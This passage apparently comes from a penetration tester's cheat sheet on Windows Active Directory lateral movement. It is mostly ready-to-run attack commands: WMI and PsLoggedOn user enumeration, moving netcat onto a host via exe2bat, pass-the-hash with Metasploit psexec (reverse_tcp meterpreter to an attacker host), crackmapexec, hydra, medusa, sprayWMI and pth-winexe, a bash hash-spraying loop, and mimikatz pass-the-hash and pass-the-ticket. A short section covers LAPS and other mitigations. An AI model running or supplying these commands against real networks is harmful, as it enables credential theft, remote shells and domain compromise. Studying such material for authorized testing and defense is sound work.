wmic path Win32_LoggedOnUser | find "273995"
wmic /node:10.50.1.254 /user:marvel.lab\troy.wood /password:"password123" path Win32_LoggedOnUser
{% endhighlight %}

Using WMiQuery

{% highlight PowerShell %}
wmiquery.py 'Administrator:Passw0rd!@10.50.1.254'
select LogonType, LogonID from Win32_logonsession where LogonType=2
{% endhighlight %}

Using PTH-Wmic

{% highlight PowerShell %}
pth-wmic -U "marvel.lab\Administrator%Passw0rd!" //10.50.1.254 'select LogonType, LogonID from Win32_logonsession where LogonType=2'
pth-wmic -U "marvel.lab\Administrator%Passw0rd!" //10.50.1.254 'select * Win32_loggedonuser'
{% endhighlight %}

Using Sysinternals PsLoggedOn64

{% highlight PowerShell %}
psexec.py -c /pentesting/PsLoggedon64.exe 'marvel.lab/Administrator:Passw0rd!@10.50.1.15' "-l -accepteula"
{% endhighlight %}

{% highlight PowerShell %}
nbtscan -r 10.50.1.0/24 | grep ^10 | awk '{ print $1 }' > /tmp/nbtscan.txt
for ip in $(cat /tmp/nbtscan.txt); do psexec.py -c /pentesting/PsLoggedon64.exe marvel.lab/Administrator:Passw0rd\!@${ip} "-l -accepteula"; done >> /tmp/loggedon.txt
{% endhighlight %}

# Transfer Files

## exe2bat.exe

Copy the binary we want to transfer using debug

{% highlight PowerShell %}
cp /usr/share/windows-binaries/nc.exe .
{% endhighlight %}

Pack it to make it smaller

{% highlight PowerShell %}
upx -9 nc.exe
{% endhighlight %}

Copy exe2bat to the current directory we are working in

{% highlight PowerShell %}
cp /usr/share/windows-binaries/exe2bat.exe .
{% endhighlight %}

Use the Windows emulator to run exe2bat to make our bat file

{% highlight PowerShell %}
wine exe2bat.exe nc.exe nc.txt
{% endhighlight %}

> Now we can cat out our nc.txt and paste it into our local shell.

# Pass-the-Hash (PtH)

While not exactly an attack, PTH is technically a feature. It does however provide us with a way of running through Windows Active Directory domains.

When on engagements if we can get privilleges of Local Administrator on a machine, we can dump the stored hashes. We can then pass these hashes to other machines in a manner that allows us to authenticate as the user. On networks where the Local Administrator password is the same on every machine we could pass the hash of the comprimised Local Administrator on our box to all the other machines in the network. If a Domain Admin has logged into one of the machines and we have access then we can pass the hash of a Domain Admin :)

A quick note

- You **CAN** perform Pass-The-Hash attacks with NTLM hashes.
- You **CANNOT** perform Pass-The-Hash attacks with Net-NTLM hashes

> An attacker can obtain local administrative access by either compromising the built-in local administrator account, a domain account with membership in the local administrators group, or another local account that can be used to install drivers, applications, and execute applications that allow direct interaction with the hard disk or volatile memory.

Further reading [Mitigating PtH](uploads\pdfs\Mitigating%20Pass-the-Hash%20(PtH)%20Attacks%20and%20Other%20Credential%20Theft%20Techniques_English.pdf)

## PtH Requirements

In order for an attacker to reuse a stolen password hash on another host, the following requirements must be met:

1. The attacker must be able to contact the remote computer over the network, and the computer must have listening services that accept network connections.
2. The account and corresponding password hash value obtained from the compromised computer must be valid credentials on the computer being authenticated to (for example, if both computers are in the same domain, or local accounts with the same user name and password exist on both computers).
3. The compromised account must have the Network Logon user right on the remote computer

## Patch

There has been several good articles detailing the specifics about potential microsoft patches. The best starting point is here: https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/

To over simplify:

If you have the hash of the true local administrator with rid 500 (does not matter if the account is renamed) or you have the hash of a domain user who also has local admin privilleges then you can pass the hashes.

We use this attack to latterally move around the network with Domain Admin being the desired end goal. Obviously if you find a Domain Admin hash you can pass that :)

So the patch wasnt really a true patch. Ways to fix this attack vector include the network admin disabling the default local admin account, creating a new regular user account, and then adding that to the local administrators group.

Alternatively, Microsofts LAPS product randomises they local administrator password for machines on a regular basis. While passing the hash will still work in principal the lack of reused local admin passwords across machines limits its usefullness.

> It’s also worth noting that Microsoft’s LAPS effectively renders everything here moot. As LAPS randomizes the local administrator password for machines on a periodic basis, pass-the-hash will effectively still work, but it greatly limits the ability to recover and reuse local key material. This renders traditional PTH attacks (with local accounts at least) largely ineffective

## Tools

### smb_login module in metasploit

We can scan a range of hosts with the metasploit smb_login module and test any hashes we might of come across in our pentest.

{% highlight PowerShell %}
use auxiliary/scanner/smb/smb_login
set smbpass aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
set smbuser Administrator
{% endhighlight %}

### psexec

metasploit - We have PsExec built into metasploit. We can pass a hash in just like smb_login

{% highlight PowerShell %}
use exploit/windows/smb/psexec
set rhost 10.10.10.254
set smbuser Administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.10.100
set lport 1337
exploit
{% endhighlight %}

psexec.py

{% highlight PowerShell %}
psexec.py 'marvel.lab/Administrator:Passw0rd!@10.50.1.65'
psexec.py 'marvel.lab/Administrator:Passw0rd!@10.50.1.65'  -c /path/to/file.exe
{% endhighlight %}

### Crackmapexec

Check the network range

{% highlight PowerShell %}
crackmapexec 10.1.1.0/24 -u evilsaint -H fc525c9683e8fe067095ba2ddc971889
{% endhighlight %}

### Hydra

we can test pass the hash with Hyrdra but we can only do one host at a time in the current version.

{% highlight PowerShell %}
hydra smb://10.10.10.200 -l Administrator -p aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 -m "local hash"
{% endhighlight %}

### Medussa

We can do pass the hash with Medusa however we need to specify items in files and feed them in, we cant enter everyting on the command line.

In this example the contents of ips.txt and pth.txt are as follows:

{% highlight PowerShell %}
root@evilsaint:/tmp# cat ips.txt
10.10.10.34
10.10.10.56
10.10.10.200
10.10.10.254

root@evilsaint:/tmp# pth.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
{% endhighlight %}

We then run the command as follows.

{% highlight PowerShell %}
medusa -H ips.txt -C pth.txt -M smbnt -m PASS:HASH
{% endhighlight %}

### SprayWMI

WMIS needs to be installed in order to use sprayWMI

{% highlight PowerShell %}
apt-get install wmis
{% endhighlight %}

On 64bit platforms, sprayWMI needs an extra step completing

{% highlight PowerShell %}
dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 libpopt0:i386
{% endhighlight %}

{% highlight PowerShell %}
python spraywmi.py WORKGROUP Administrator 7bfd3ee62cbb0eba886450c5d6c50f12:f3acbe7ec27aadbe8deeaa0c651a64af 10.10.10.10 windows/meterpreter/reverse_tcp 10.10.10.11 8080
{% endhighlight %}

https://github.com/trustedsec/spraywmi

### pth-toolkit

Before we look at one of the tools (`pth-winexe`) it should be noted that the “pth” suite contains a bunch of programs that have been patched to support authenticating with patches:

{% highlight PowerShell %}
pth-net
pth-rpcclient
pth-smbclient
pth-smbget
pth-sqsh
pth-winexe
pth-wmic
pth-wmis
{% endhighlight %}

Standard syntax for `pht-winexe`

{% highlight PowerShell %}
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 //10.10.10.200 cmd.exe
{% endhighlight %}

OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide.

{% highlight PowerShell %}
pth-winexe --ostype=2 -U Administrator%aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 //10.10.10.200 cmd.exe
{% endhighlight %}

Alternative method

{% highlight PowerShell %}
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
pth-winexe -U Administrator% //10.10.10.200 cmd.exe
{% endhighlight %}

## Mimikatz

From within a command prompt (or PowerShell if you’re using Invoke-Mimikatz), run the sekurlsa::pth module and specify the user, domain and NTLM hash. This will pop open another cmd prompt as if you just successfully did a “runas”

{% highlight PowerShell %}
mimikatz # sekurlsa::pth /user:evilsaint /domain:acme.lab /ntlm:fc525c9683e8fe067095ba2ddc971889
{% endhighlight %}

### winexe

Method 1

{% highlight PowerShell %}
root@kali:~/Downloads# winexe -U Administrator%7bfd3ee62cbb0eba886450c5d6c50f12:f3acbe7ec27aadbe8deeaa0c651a64af //10.10.10.10 cmd.exe
{% endhighlight %}

Method 2

{% highlight PowerShell %}
root@kali:~/Downloads# export
SMBHASH=aad3b435b51404eeaad3b435b51404ee:f3acbe7ec27aadbe8deeaa0c651a64af
root@kali:~/Downloads# winexe -U Administrator% //10.10.10.10 cmd.exe
{% endhighlight %}

### Script

We store out hashes in the following format.

{% highlight PowerShell %}
cat hash.lst
administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
{% endhighlight %}

cat spray.sh

{% highlight PowerShell %}
#!/bin/bashecho "[*] Usage : $0 <hashfile> <ip or iprange>"hashfile=$1iprange=$2echo "[*] Trying to login "for host in $(nmap -p 139,445 $iprange -oG - | grep [0-9]/open | cut -d ' ' -f2); do    while IFS=: read -r smbuser f2 f3 f4 rest; do        smbhash="${f3}:${f4}"        echo        echo "[+] DOING $smbuser@$host with HASH: $smbhash"        pth-winexe -U $smbuser%$smbhash //$host cmd; #the code that tries to login    done < "$hashfile"done
{% endhighlight %}

To run the script

{% highlight PowerShell %}
./spray.sh hash.lst 10.10.10.200
{% endhighlight %}

# Pass the Ticket

As with a PtH attack, this type of credential theft and reuse attack requires the attacker to obtain local administrative access to capture the stored Ticket Granting Tickets (TGTs) before they can reused with the Kerberos protocol. A Kerberos TGT and the associated session key together comprise a reusable credential for the Kerberos protocol. TGTs have a default lifespan of about 10 hours, and a default total lifetime of 7 days, if that TGT is repeatedly renewed before it expires. Attackers can steal TGTs and associated session keys and request a new session ticket at will until the renewal lifetime is reached

A significant difference in the attack value between NT hashes used in NTLM authentication and TGTs, is that password hashes are reusable until the user’s password changes, while TGTs expire in a matter of hours according to their lifetime. While Kerberos authentication is vulnerable to a similar attack, it is not likely to displace PtH attacks until NTLM becomes unavailable in organizations targeted by attackers. Unless the use of NTLM is explicitly disabled, password hashes are still created and stored in the LSASS process memory, and they are valid for authentication. NTLM also remains the most commonly used authentication protocol, because of the current level of NTLM support and compatibility with existing devices and software.

Start exporting tickets

{% highlight PowerShell %}
privilege::debug
sekurlsa::tickets /export
{% endhighlight %}

Find a krbtgt

{% highlight PowerShell %}
dir | findstr "krbtgt"
{% endhighlight %}

Inject the ticket into the terminal

{% highlight PowerShell %}
kerberos::ptt black.widow@krbtgt-marvel.lab.kirbi
{% endhighlight %}

If this works you can get a directory index of the admin folder on the DC

{% highlight PowerShell %}
dir \\DC01\admin$
{% endhighlight %}